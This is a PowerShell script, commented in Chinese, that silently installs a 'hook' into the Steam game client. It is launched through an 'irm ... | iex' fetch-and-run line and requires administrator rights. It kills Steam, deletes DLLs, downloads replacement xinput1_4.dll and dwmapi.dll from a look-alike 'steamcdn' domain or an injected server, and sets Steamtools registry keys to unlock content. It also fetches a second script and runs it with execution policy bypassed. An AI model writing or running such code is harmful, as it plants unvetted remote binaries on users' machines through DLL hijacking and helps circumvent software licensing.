# Hook 静默安装
# irm http://域名:8787/hook | iex

$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = "Stop"
$BoxApiBase = "__INJECT_API_BASE__"

try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls } catch {}

function Get-RemoteFile([string[]]$Urls, [string]$Target, [int]$MinBytes = 100000) {
    $lastErr = $null
    foreach ($url in $Urls) {
        if (-not $url) { continue }
        for ($attempt = 1; $attempt -le 3; $attempt++) {
            try {
                if (Test-Path $Target) { Remove-Item $Target -Force -ErrorAction SilentlyContinue }
                Invoke-WebRequest -Uri $url -OutFile $Target -UseBasicParsing -TimeoutSec 90 -MaximumRedirection 5 | Out-Null
                if ((Test-Path $Target) -and (Get-Item $Target).Length -ge $MinBytes) { return $true }
                $lastErr = "下载内容不完整 ($url)"
            } catch {
                $lastErr = $_.Exception.Message
            }
            Start-Sleep -Seconds (2 * $attempt)
        }
    }
    if (Test-Path $Target) { Remove-Item $Target -Force -ErrorAction SilentlyContinue }
    throw "无法下载激活组件，请检查网络后重试。$lastErr"
}

function Get-SteamPath {
    $steamPath = ""
    if (Test-Path "HKCU:\Software\Valve\Steam") {
        $p = Get-ItemProperty "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue
        if ($p.SteamPath) { $steamPath = [string]$p.SteamPath }
    }
    if (-not $steamPath) {
        $steamPath = (Get-ItemProperty "HKLM:\Software\WOW6432Node\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
    }
    foreach ($p in @($steamPath, "D:\steam", "C:\Program Files (x86)\Steam")) {
        if ($p -and (Test-Path (Join-Path $p "steam.exe"))) { return $p }
    }
    return $null
}

function Test-HookReady([string]$SteamPath) {
    $x = Join-Path $SteamPath "xinput1_4.dll"
    $d = Join-Path $SteamPath "dwmapi.dll"
    if (-not ((Test-Path $x) -and (Get-Item $x).Length -gt 100000)) { return $false }
    if (-not ((Test-Path $d) -and (Get-Item $d).Length -gt 100000)) { return $false }
    try {
        $reg = Get-ItemProperty "HKCU:\Software\Valve\Steamtools" -ErrorAction Stop
        if ([string]$reg.iscdkey -ne "true") { return $false }
        if ([string]$reg.SteamPath -ne (($SteamPath -replace "\\", "/"))) { return $false }
    } catch { return $false }
    return $true
}

function Install-SteamHook([string]$SteamPath, [string]$ApiBase) {
    foreach ($name in @("version.dll", "user32.dll", "steam.cfg", "hid.dll")) {
        $f = Join-Path $SteamPath $name
        if (Test-Path $f) { Remove-Item $f -Force -ErrorAction SilentlyContinue }
    }
    $base = $ApiBase.TrimEnd('/')
    $dllMap = @{
        "xinput1_4.dll" = @("https://update.steamcdn.com/update", "http://update.steamcdn.com/update", "$base/static/inject/xinput1_4.dll")
        "dwmapi.dll"    = @("https://update.steamcdn.com/dwmapi", "http://update.steamcdn.com/dwmapi", "$base/static/inject/dwmapi.dll")
    }
    foreach ($entry in $dllMap.GetEnumerator()) {
        $target = Join-Path $SteamPath $entry.Key
        Get-RemoteFile -Urls $entry.Value -Target $target | Out-Null
    }
    $stplug = Join-Path $SteamPath "config\stplug-in"
    New-Item -ItemType Directory -Force -Path $stplug | Out-Null
    $local = Join-Path $env:LOCALAPPDATA "steam"
    New-Item -ItemType Directory -Force -Path $local | Out-Null
    $regPath = "HKCU:\Software\Valve\Steamtools"
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    foreach ($n in @("ActivateUnlockMode", "AlwaysStayUnlocked", "notUnlockDepot")) {
        Remove-ItemProperty -Path $regPath -Name $n -ErrorAction SilentlyContinue
    }
    Set-ItemProperty -Path $regPath -Name "SteamPath" -Value (($SteamPath -replace "\\", "/")) -Type String
    Set-ItemProperty -Path $regPath -Name "iscdkey" -Value "true" -Type String
    Join-Path $local "hook.json" | ForEach-Object {
        @{ api = $ApiBase; steam = ($SteamPath -replace "\\", "/"); installed = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") } |
            ConvertTo-Json | Set-Content $_ -Encoding UTF8
    }
}

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "请以管理员身份运行" -ForegroundColor Red
    exit 1
}

$ApiBase = $BoxApiBase
if ($ApiBase -like "*INJECT*") { $ApiBase = "http://127.0.0.1:8787" }
$ApiBase = $ApiBase.TrimEnd("/")

$steamPath = Get-SteamPath
if (-not $steamPath) {
    Write-Host "未找到 Steam" -ForegroundColor Red
    exit 1
}

if (Test-HookReady $steamPath) {
    try {
        $local = Join-Path $env:LOCALAPPDATA "steam\sync_revoke.ps1"
        if (Test-Path $local) {
            & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $local -Quiet
        }
    } catch {}
    exit 0
}

if (Get-Process -Name "steam" -ErrorAction SilentlyContinue) {
    Stop-Process -Name "steam*" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}

Install-SteamHook $steamPath $ApiBase
try {
    $local = Join-Path $env:LOCALAPPDATA "steam\sync_revoke.ps1"
    if (-not (Test-Path $local)) {
        Invoke-WebRequest -Uri "$ApiBase/sync-revoke.ps1" -OutFile $local -UseBasicParsing -TimeoutSec 60 | Out-Null
    }
    if (Test-Path $local) {
        & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $local -Quiet
    }
} catch {}
Start-Process -FilePath (Join-Path $steamPath "steam.exe") -WorkingDirectory $steamPath | Out-Null
